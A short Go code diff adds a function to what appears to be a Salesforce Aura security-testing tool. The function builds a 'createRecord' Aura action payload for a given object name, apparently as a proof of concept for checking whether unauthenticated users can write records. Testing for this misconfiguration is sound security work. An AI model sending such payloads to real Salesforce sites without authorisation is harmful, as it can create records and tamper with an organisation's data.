@@ -47,3 +47,23 @@ func PayloadGeneratorGetRecord(recodeId string) []byte {
 	return genPOC
 
 }
+
+
+func PayloadGeneratorWritableOBJ(objectName string) []byte {
+
+	payload1 := `[{"id":"123;a","descriptor":"aura://RecordUiController/ACTION$createRecord","callingDescriptor":"UNKNOWN","params":{"recordInput":{"apiName":"`
+	payload2 := objectName
+	payload3 := `","fields":{}}}}]`
+	finalpayload := []byte(payload1 + payload2 + payload3)
+
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+
+	genPOC, err := json.Marshal(p)
+
+	if err != nil {
+		panic(err)
+	}
+	return genPOC
+}
